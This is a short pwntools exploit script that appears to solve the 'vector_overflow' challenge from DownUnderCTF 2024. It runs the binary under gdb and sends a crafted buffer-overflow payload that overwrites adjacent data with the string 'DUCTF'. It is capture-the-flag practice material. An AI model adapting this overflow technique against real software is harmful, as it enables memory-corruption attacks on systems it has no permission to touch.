from pwn import *

host, port = "2024.ductf.dev", 30013

elf = context.binary = ELF("./vector_overflow")

context.terminal = ["alacritty", "-e", "sh", "-c"]

conn = elf.process()

gdb.attach(conn, gdbscript="""b *(main+73)""")


# conn = remote(host, port)


payload = b"A" * 16 + p64(0x0) + p64(5) + b"A" * 16 + p64(0x0) + b"DUCTF"

print(payload)

conn.sendline(payload)

conn.interactive()
